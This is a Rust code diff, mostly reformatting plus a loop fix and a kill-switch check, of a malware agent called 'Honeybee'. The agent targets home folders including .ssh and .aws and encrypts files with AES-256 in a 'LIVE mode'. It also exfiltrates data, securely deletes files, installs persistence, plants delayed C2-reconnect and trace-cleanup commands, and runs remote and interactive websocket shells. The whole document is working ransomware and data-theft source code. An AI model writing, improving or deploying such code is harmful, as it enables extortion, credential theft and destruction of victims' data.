@@ -1,19 +1,23 @@
-use hive_base::{AgentIdentity, ConsensusEngine, HiveChamber, Message, Payload, Role, Decision};
-use hive_base::phoenix::{Phoenix, AgentBlueprint, FragmentLocation, GenomeFragment};
+use aes_gcm::aead::{Aead, KeyInit};
+use aes_gcm::{Aes256Gcm, Key, Nonce};
+use hive_base::phoenix::{AgentBlueprint, FragmentLocation, GenomeFragment, Phoenix};
+use hive_base::{AgentIdentity, ConsensusEngine, Decision, HiveChamber, Message, Payload, Role};
+use rand::Rng;
+use sha2::{Digest, Sha256};
 use std::collections::HashMap;
 use std::path::PathBuf;
 use std::time::Duration;
 use tokio::time;
 use tracing::{info, warn};
 use uuid::Uuid;
-use serde_json;
-use aes_gcm::{Aes256Gcm, Key, Nonce};
-use aes_gcm::aead::{Aead, KeyInit};
-use rand::Rng;
-use sha2::{Sha256, Digest};
 
 #[derive(Debug, Clone, PartialEq)]
-enum HoarderState { Idle, WaitingForConsensus, Executing, Complete }
+enum HoarderState {
+    Idle,
+    WaitingForConsensus,
+    Executing,
+    Complete,
+}
 
 struct HoarderAgent {
     comms: HiveChamber,
@@ -45,19 +49,19 @@ impl HoarderAgent {
             info!("Honeybee: LIVE mode — real encryption/exfil/destroy enabled");
         }
 
-        let whispernet = hive_base::whispernet::WhisperNet::new(
-            hive_base::whispernet::WhisperConfig {
+        let whispernet =
+            hive_base::whispernet::WhisperNet::new(hive_base::whispernet::WhisperConfig {
                 node_id: identity.id(),
                 listen_port: 0,
                 max_peers: 16,
                 max_hops: 5,
                 heartbeat_interval_secs: 60,
                 encryption_enabled: true,
-            }
-        );
+            });
 
         let mut agent = Self {
-            comms, identity,
+            comms,
+            identity,
             consensus: ConsensusEngine::new(cfg.consensus.hoarder_threshold),
             whispernet,
             state: HoarderState::Idle,
@@ -85,8 +89,7 @@ impl HoarderAgent {
 
     fn install_phoenix_persistence(&mut self) {
         let base_path = std::env::temp_dir();
-        let exe_path = std::env::current_exe()
-            .unwrap_or_else(|_| PathBuf::from("/tmp/honeybee"));
+        let exe_path = std::env::current_exe().unwrap_or_else(|_| PathBuf::from("/tmp/honeybee"));
         let loader = exe_path.to_string_lossy().to_string();
 
         let mechs = Phoenix::install_persistence(&loader, &base_path);
@@ -98,7 +101,8 @@ impl HoarderAgent {
     fn setup_phoenix_genome(&mut self) {
         let base_path = std::env::temp_dir();
         let exe_path = std::env::current_exe();
-        let binary_hash = exe_path.as_ref()
+        let binary_hash = exe_path
+            .as_ref()
             .ok()
             .and_then(|p| std::fs::read(p).ok())
             .map(|d| {
@@ -107,7 +111,8 @@ impl HoarderAgent {
             })
             .unwrap_or_else(|| "unknown".into());
 
-        let binary_size = exe_path.as_ref()
+        let binary_size = exe_path
+            .as_ref()
             .ok()
             .and_then(|p| std::fs::metadata(p).ok())
             .map(|m| m.len())
@@ -140,7 +145,14 @@ impl HoarderAgent {
         let mut targets = Vec::new();
         let home = std::env::var("HOME").unwrap_or_else(|_| "/tmp".into());
 
-        for dir in &["Documents", "Desktop", "Downloads", ".ssh", ".aws", ".config"] {
+        for dir in &[
+            "Documents",
+            "Desktop",
+            "Downloads",
+            ".ssh",
+            ".aws",
+            ".config",
+        ] {
             let path = PathBuf::from(&home).join(dir);
             if path.exists() {
                 targets.push(path);
@@ -165,30 +177,29 @@ impl HoarderAgent {
     }
 
     fn encrypt_file(&self, path: &PathBuf, key: &[u8; 32]) -> Result<u64, String> {
-        let data = std::fs::read(path)
-            .map_err(|e| format!("read {}: {}", path.display(), e))?;
+        let data = std::fs::read(path).map_err(|e| format!("read {}: {}", path.display(), e))?;
         let original_size = data.len() as u64;
 
         let cipher = Aes256Gcm::new(Key::<Aes256Gcm>::from_slice(key));
         let nonce_bytes: [u8; 12] = rand::thread_rng().gen();
         let nonce = Nonce::from_slice(&nonce_bytes);
 
-        let ciphertext = cipher.encrypt(nonce, data.as_slice())
+        let ciphertext = cipher
+            .encrypt(nonce, data.as_slice())
             .map_err(|e| format!("encrypt {}: {}", path.display(), e))?;
 
         let mut output = Vec::with_capacity(12 + ciphertext.len());
         output.extend_from_slice(&nonce_bytes);
         output.extend_from_slice(&ciphertext);
 
-        std::fs::write(path, &output)
-            .map_err(|e| format!("write {}: {}", path.display(), e))?;
+        std::fs::write(path, &output).map_err(|e| format!("write {}: {}", path.display(), e))?;
 
         Ok(original_size)
     }
 
     fn secure_delete_file(&self, path: &PathBuf) -> Result<u64, String> {
-        let metadata = std::fs::metadata(path)
-            .map_err(|e| format!("stat {}: {}", path.display(), e))?;
+        let metadata =
+            std::fs::metadata(path).map_err(|e| format!("stat {}: {}", path.display(), e))?;
         let size = metadata.len();
 
         for _ in 0..3 {
@@ -203,17 +214,24 @@ impl HoarderAgent {
         std::fs::write(path, vec![0u8; size.min(4096) as usize])
             .map_err(|e| format!("zero {}: {}", path.display(), e))?;
 
-        std::fs::remove_file(path)
-            .map_err(|e| format!("delete {}: {}", path.display(), e))?;
+        std::fs::remove_file(path).map_err(|e| format!("delete {}: {}", path.display(), e))?;
 
         Ok(size)
     }
 
     async fn execute_encrypt(&mut self) {
         if self.safe_mode {
-            info!("Honeybee: SAFE MODE — encrypt simulated ({} paths)", self.target_paths.len());
-            let msg = Message::belief(self.identity.id(), Role::Honeybee,
-                "encrypt_result".into(), hive_base::Value::String("simulated (safe_mode)".into()), 1.0);
+            info!(
+                "Honeybee: SAFE MODE — encrypt simulated ({} paths)",
+                self.target_paths.len()
+            );
+            let msg = Message::belief(
+                self.identity.id(),
+                Role::Honeybee,
+                "encrypt_result".into(),
+                hive_base::Value::String("simulated (safe_mode)".into()),
+                1.0,
+            );
             self.publish_msg(msg).await;
             return;
         }
@@ -223,8 +241,13 @@ impl HoarderAgent {
             info!("Generated AES-256 encryption key");
         }
 
-        let key: &[u8; 32] = self.encryption_key.as_ref()
-            .unwrap().as_slice().try_into().unwrap();
+        let key: &[u8; 32] = self
+            .encryption_key
+            .as_ref()
+            .unwrap()
+            .as_slice()
+            .try_into()
+            .unwrap();
 
         let mut encrypted = 0u64;
         let mut failed = 0u64;
@@ -264,7 +287,8 @@ impl HoarderAgent {
         }
 
         let msg = Message::belief(
-            self.identity.id(), Role::Honeybee,
+            self.identity.id(),
+            Role::Honeybee,
             "encrypt_result".into(),
             hive_base::Value::String(format!("encrypted={},failed={}", encrypted, failed)),
             1.0,
@@ -290,7 +314,8 @@ impl HoarderAgent {
                         total_bytes += data.len() as u64;
                         info!("Exfiltrated: {} ({} bytes)", path.display(), data.len());
 
-                        let filename = path.file_name()
+                        let filename = path
+                            .file_name()
                             .map(|n| n.to_string_lossy().to_string())
                             .unwrap_or_else(|| "data".into());
 
@@ -308,8 +333,12 @@ impl HoarderAgent {
                             info!("WhisperNet: relayed exfil notification for {}", filename);
                         }
 
-                        let exfil_data = format!("exfil:{}:{}b:{}", filename, data.len(),
-                            hive_base::utils::timestamp_now());
+                        let exfil_data = format!(
+                            "exfil:{}:{}b:{}",
+                            filename,
+                            data.len(),
+                            hive_base::utils::timestamp_now()
+                        );
                         let mut recovery_fragment = GenomeFragment {
                             fragment_id: total_bytes as u32,
                             total_fragments: 1,
@@ -329,7 +358,8 @@ impl HoarderAgent {
         }
 
         let msg = Message::belief(
-            self.identity.id(), Role::Honeybee,
+            self.identity.id(),
+            Role::Honeybee,
             "exfil_result".into(),
             hive_base::Value::Int(total_bytes as i64),
             1.0,
@@ -339,7 +369,10 @@ impl HoarderAgent {
 
     async fn execute_destroy(&mut self) {
         if self.safe_mode {
-            info!("Honeybee: SAFE MODE — destroy simulated ({} paths)", self.target_paths.len());
+            info!(
+                "Honeybee: SAFE MODE — destroy simulated ({} paths)",
+                self.target_paths.len()
+            );
             return;
         }
         let mut deleted = 0u64;
@@ -361,7 +394,8 @@ impl HoarderAgent {
         }
 
         let msg = Message::belief(
-            self.identity.id(), Role::Honeybee,
+            self.identity.id(),
+            Role::Honeybee,
             "destroy_result".into(),
             hive_base::Value::String(format!("deleted={},failed={}", deleted, failed)),
             1.0,
@@ -370,33 +404,53 @@ impl HoarderAgent {
     }
 
     async fn plant_chrononaut_capsules(&self) -> Result<(), String> {
-        let delayed_commands = ["reconnect_c2",
+        let delayed_commands = [
+            "reconnect_c2",
             "rotate_keys",
             "trigger_backup",
-            "cleanup_traces"];
+            "cleanup_traces",
+        ];
 
         let now = std::time::SystemTime::now()
             .duration_since(std::time::UNIX_EPOCH)
             .map(|d| d.as_secs())
             .unwrap_or(0);
 
-        for (i, cmd) in delayed_commands.iter().enumerate() {
-            if let Some(path) = self.target_paths.iter().find(|p| {
-                p.extension().and_then(|e| e.to_str()) == Some("log")
-            }) {
-                let capsule = hive_base::chrononaut::TimeCapsule {
-                    capsule_id: Uuid::new_v4(),
-                    trigger_timestamp: now + 3600 * (i as u64 + 1),
-                    command: cmd.to_string(),
-                    payload: vec![],
-                    host_hint: "self".into(),
-                    executed: false,
-                };
+        // Collect the log files once up front: the find() used to run inside
+        // the loop, so every capsule landed on the same first match.
+        let log_paths: Vec<&std::path::PathBuf> = self
+            .target_paths
+            .iter()
+            .filter(|p| p.extension().and_then(|e| e.to_str()) == Some("log"))
+            .collect();
 
-                hive_base::chrononaut::Chrononaut::encode_in_timestamp(path, &capsule)
-                    .map_err(|e| format!("chrononaut: {}", e))?;
-                info!("Chrononaut: capsule {} planted in {}, trigger in {}h",
-                    cmd, path.display(), i + 1);
+        for (i, cmd) in delayed_commands.iter().enumerate() {
+            match log_paths.get(i % log_paths.len().max(1)) {
+                Some(&path) => {
+                    let capsule = hive_base::chrononaut::TimeCapsule {
+                        capsule_id: Uuid::new_v4(),
+                        trigger_timestamp: now + 3600 * (i as u64 + 1),
+                        command: cmd.to_string(),
+                        payload: vec![],
+                        host_hint: "self".into(),
+                        executed: false,
+                    };
+
+                    hive_base::chrononaut::Chrononaut::encode_in_timestamp(path, &capsule)
+                        .map_err(|e| format!("chrononaut: {}", e))?;
+                    info!(
+                        "Chrononaut: capsule {} planted in {}, trigger in {}h",
+                        cmd,
+                        path.display(),
+                        i + 1
+                    );
+                }
+                None => {
+                    warn!(
+                        "Chrononaut: no .log target files available for capsule {}",
+                        cmd
+                    );
+                }
             }
         }
         Ok(())
@@ -407,27 +461,48 @@ impl HoarderAgent {
 
         for msg in messages {
             self.consensus.process_message(&msg);
+            if msg.is_kill_switch() {
+                warn!("Kill switch received - agent self-destructing now");
+                std::process::exit(0);
+            }
             match &msg.payload {
-                Payload::Proposal { action, argument: _, proposal_id } => {
+                Payload::Proposal {
+                    action,
+                    argument: _,
+                    proposal_id,
+                } => {
                     let action_lower = action.to_lowercase();
-                    if action_lower.contains("encrypt") || action_lower.contains("exfiltrate")
-                        || action_lower.contains("destroy") || action_lower.contains("ransom")
+                    if action_lower.contains("encrypt")
+                        || action_lower.contains("exfiltrate")
+                        || action_lower.contains("destroy")
+                        || action_lower.contains("ransom")
                     {
                         info!("Action proposal: {} (from {})", action, msg.agent_role);
                         self.active_proposals.push(*proposal_id);
                         let weight = self.consensus.get_reputation(&msg.agent_id);
                         let vote = Message::vote(
-                            self.identity.id(), Role::Honeybee,
-                            *proposal_id, Decision::Support, weight,
+                            self.identity.id(),
+                            Role::Honeybee,
+                            *proposal_id,
+                            Decision::Support,
+                            weight,
                         );
                         self.publish_msg(vote).await;
                         self.state = HoarderState::WaitingForConsensus;
                     }
                 }
-                Payload::Belief { asset, value, confidence } => {
+                Payload::Belief {
+                    asset,
+                    value,
+                    confidence,
+                } => {
                     info!("Belief: {} = {:?} ({})", asset, value, confidence);
                 }
-                Payload::StatusEvent { event_type, subject_id, .. } if event_type == "agent_dead" => {
+                Payload::StatusEvent {
+                    event_type,
+                    subject_id,
+                    ..
+                } if event_type == "agent_dead" => {
                     warn!("Agent {} reported DEAD", subject_id);
                 }
                 Payload::Request { service, .. } if service == "privesc" => {
@@ -446,11 +521,13 @@ impl HoarderAgent {
                         info!("EXEC: executing cmd_id={}: {}", cmd_id, cmd);
                         let result = hive_base::remote_shell::execute_command(&cmd);
                         let result_msg = Message::belief(
-                            self.identity.id(), Role::Honeybee,
+                            self.identity.id(),
+                            Role::Honeybee,
                             format!("exec:result:{}", cmd_id),
                             hive_base::Value::String(format!(
                                 "exit={} duration={}ms stdout={} stderr={}",
-                                result.exit_code, result.duration_ms,
+                                result.exit_code,
+                                result.duration_ms,
                                 result.stdout.trim().chars().take(500).collect::<String>(),
                                 result.stderr.trim().chars().take(200).collect::<String>(),
                             )),
@@ -472,14 +549,19 @@ impl HoarderAgent {
                 }
                 Payload::Request { service, payload } if service == "shell" => {
                     if let Ok(cmd_data) = serde_json::from_slice::<serde_json::Value>(payload) {
-                        let ws_url = cmd_data["url"].as_str().unwrap_or("ws://127.0.0.1:9000/shell");
+                        let ws_url = cmd_data["url"]
+                            .as_str()
+                            .unwrap_or("ws://127.0.0.1:9000/shell");
                         let cmd_id = cmd_data["cmd_id"].as_str().unwrap_or("unknown");
                         info!("SHELL: starting interactive shell -> {}", ws_url);
                         let shell = hive_base::remote_shell::WsShell::start(ws_url);
                         let prev = self.interactive_shell.replace(shell);
-                        if let Some(mut old) = prev { old.stop(); }
+                        if let Some(mut old) = prev {
+                            old.stop();
+                        }
                         let result_msg = Message::belief(
-                            self.identity.id(), Role::Honeybee,
+                            self.identity.id(),
+                            Role::Honeybee,
                             format!("shell:result:{}", cmd_id),
                             hive_base::Value::String("started".into()),
                             1.0,
@@ -499,8 +581,10 @@ impl HoarderAgent {
             for pid in self.active_proposals.clone() {
                 if let Some((reached, ratio, total)) = self.consensus.check_consensus(&pid) {
                     if reached && self.state == HoarderState::WaitingForConsensus {
-                        info!("Consensus reached for {} (ratio: {:.2}, weight: {:.2})",
-                            pid, ratio, total);
+                        info!(
+                            "Consensus reached for {} (ratio: {:.2}, weight: {:.2})",
+                            pid, ratio, total
+                        );
                         self.state = HoarderState::Executing;
 
                         if let Some(record) = self.consensus.proposals.get(&pid) {
@@ -526,8 +610,10 @@ impl HoarderAgent {
         for pid in self.active_proposals.clone() {
             if let Some((reached, ratio, total)) = self.consensus.check_consensus(&pid) {
                 if reached && self.state == HoarderState::WaitingForConsensus {
-                    info!("Consensus reached for {} (ratio: {:.2}, weight: {:.2})",
-                        pid, ratio, total);
+                    info!(
+                        "Consensus reached for {} (ratio: {:.2}, weight: {:.2})",
+                        pid, ratio, total
+                    );
                     self.state = HoarderState::Executing;
 
                     if let Some(record) = self.consensus.proposals.get(&pid) {
@@ -544,16 +630,21 @@ impl HoarderAgent {
                     }
                     self.state = HoarderState::Complete;
                 } else if reached {
-                    info!("Consensus reached but state not waiting (state={:?}), ignoring",
-                        self.state);
+                    info!(
+                        "Consensus reached but state not waiting (state={:?}), ignoring",
+                        self.state
+                    );
                 }
             }
         }
     }
 
     async fn run(&mut self) {
-        info!("Hive Honeybee starting | ID: {} | Targets: {} paths",
-            self.identity.id(), self.target_paths.len());
+        info!(
+            "Hive Honeybee starting | ID: {} | Targets: {} paths",
+            self.identity.id(),
+            self.target_paths.len()
+        );
         self.send_heartbeat().await;
         let mut heartbeat_timer = time::interval(self.heartbeat_interval);
         let mut whisper_timer = time::interval(Duration::from_secs(60));
